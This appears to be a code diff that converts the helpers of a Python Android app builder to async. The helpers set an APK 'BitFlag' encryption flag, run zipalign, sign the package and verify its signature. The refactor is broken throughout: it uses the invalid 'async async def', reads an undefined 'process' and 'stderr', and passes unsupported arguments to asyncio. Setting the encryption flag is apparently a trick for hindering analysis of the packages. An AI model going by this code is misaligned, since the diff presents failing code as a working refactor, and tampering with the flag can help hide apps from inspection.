@@ -16,7 +16,7 @@ from .keystore_generator import create_temp_keystore, cleanup_keystore
 logger = logging.getLogger(__name__)
 
 
-def modify_apk_encryption(input_apk, output_apk):
+async async def modify_apk_encryption(input_apk, output_apk):
     try:
         logger.info(f"Modifying BitFlag: {input_apk}")
 
@@ -64,7 +64,7 @@ def modify_apk_encryption(input_apk, output_apk):
         return False
 
 
-def zipalign_apk(input_apk, output_apk):
+async async def zipalign_apk(input_apk, output_apk):
     try:
         logger.info(f"Running zipalign: {input_apk}")
 
@@ -76,10 +76,10 @@ def zipalign_apk(input_apk, output_apk):
             os.remove(output_apk)
 
         cmd = [ZIPALIGN_PATH, "-p", "-f", "-v", "4", input_apk, output_apk]
-        result = subprocess.run(cmd, capture_output=True, text=True)
+        result = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE); stdout, stderr = await process.communicate()
 
-        if result.returncode != 0:
-            logger.error(f"zipalign error: {result.stderr}")
+        if process.returncode != 0:
+            logger.error(f"zipalign error: {stderr.decode()}")
             return False
 
         if not os.path.exists(output_apk):
@@ -94,7 +94,7 @@ def zipalign_apk(input_apk, output_apk):
         return False
 
 
-def sign_apk(input_apk, output_apk, keystore_path=None, password=None, alias=None):
+async async def sign_apk(input_apk, output_apk, keystore_path=None, password=None, alias=None):
     temp_keystore = None
 
     try:
@@ -153,10 +153,10 @@ def sign_apk(input_apk, output_apk, keystore_path=None, password=None, alias=Non
             input_apk
         ]
 
-        result = subprocess.run(cmd, capture_output=True, text=True)
+        result = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE); stdout, stderr = await process.communicate()
 
-        if result.returncode != 0:
-            logger.error(f"Signing failed: {result.stderr}")
+        if process.returncode != 0:
+            logger.error(f"Signing failed: {stderr.decode()}")
             return None
 
         if not os.path.exists(output_apk):
@@ -174,21 +174,21 @@ def sign_apk(input_apk, output_apk, keystore_path=None, password=None, alias=Non
             cleanup_keystore(temp_keystore)
 
 
-def verify_apk_signature(apk_path):
+async async def verify_apk_signature(apk_path):
     try:
         logger.info(f"Verifying signature: {apk_path}")
 
-        result = subprocess.run([
+        process = await asyncio.create_subprocess_exec(*[
             APKSIGNER_PATH, "verify",
             "--verbose",
             apk_path
         ], capture_output=True, text=True)
 
-        if result.returncode == 0:
+        if process.returncode == 0:
             logger.info("✅ Signature verified")
             return True
         else:
-            logger.warning(f"Signature verification warning: {result.stderr}")
+            logger.warning(f"Signature verification warning: {stderr.decode()}")
             return False
 
     except Exception as e:
@@ -298,14 +298,14 @@ async def build_apk(user_id, device_token, base_apk_path, custom_theme=None, app
             return False, "APK not created"
 
         logger.info("STEP 4: Modifying BitFlag...")
-        if not await asyncio.to_thread(modify_apk_encryption, output_apk, modified_apk):
+        if not await modify_apk_encryption( output_apk, modified_apk):
             logger.error("BitFlag failed")
             return False, "BitFlag modification failed"
 
         logger.info("✅ BitFlag done")
 
         logger.info("STEP 5: Running zipalign...")
-        if not await asyncio.to_thread(zipalign_apk, modified_apk, aligned_apk):
+        if not await zipalign_apk( modified_apk, aligned_apk):
             logger.error("zipalign failed")
             return False, "zipalign failed"
 
@@ -316,7 +316,7 @@ async def build_apk(user_id, device_token, base_apk_path, custom_theme=None, app
         logger.info("✅ zipalign done")
 
         logger.info("STEP 6: Signing APK...")
-        sign_result = await asyncio.to_thread(sign_apk, aligned_apk, final_apk)
+        sign_result = await sign_apk( aligned_apk, final_apk)
 
         if sign_result is None:
             logger.error("Signing failed")
@@ -329,7 +329,7 @@ async def build_apk(user_id, device_token, base_apk_path, custom_theme=None, app
         logger.info("✅ Signing done")
 
         logger.info("STEP 7: Verifying signature...")
-        is_verified = await asyncio.to_thread(verify_apk_signature, final_apk)
+        is_verified = await verify_apk_signature( final_apk)
 
         if not is_verified:
             logger.warning("Verification warning (but APK should still work)")
